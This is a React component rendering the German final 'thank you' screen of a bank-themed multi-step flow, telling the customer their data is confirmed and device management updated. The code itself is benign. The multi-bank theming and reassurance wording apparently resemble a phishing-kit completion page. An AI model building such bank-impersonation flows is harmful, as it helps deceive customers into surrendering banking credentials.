import { CheckCircle2, Home } from "lucide-react";
import { Link } from "@tanstack/react-router";
import type { FlowTheme } from "./BankShell";

export function CompletionStep({ theme, customerName }: { theme: FlowTheme; customerName: string }) {
  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;
  return (
    <div className="max-w-xl mx-auto">
      <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-8 sm:p-10 text-center">
        <div className="mx-auto w-16 h-16 rounded-full flex items-center justify-center mb-5" style={{ backgroundColor: `${theme.buttonBg}1a` }}>
          <CheckCircle2 className="w-10 h-10" style={{ color: theme.buttonBg }} />
        </div>
        <h2 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: themeColor }}>
          Vielen Dank{customerName ? `, ${customerName.split(" ")[0]}` : ""}!
        </h2>
        <p className="text-sm text-gray-600 leading-relaxed">
          Ihre Daten wurden erfolgreich bestätigt und Ihre Geräteverwaltung aktualisiert.
          Sie können Ihr Online-Banking wie gewohnt nutzen.
        </p>
        <div className="mt-8">
          <Link
            to="/"
            className={`inline-flex items-center gap-2 px-6 py-3 ${theme.buttonRadius} text-white font-medium hover:opacity-90`}
            style={{ backgroundColor: theme.buttonBg }}
          >
            <Home className="w-4 h-4" /> Zur Startseite
          </Link>
        </div>
      </div>
    </div>
  );
}
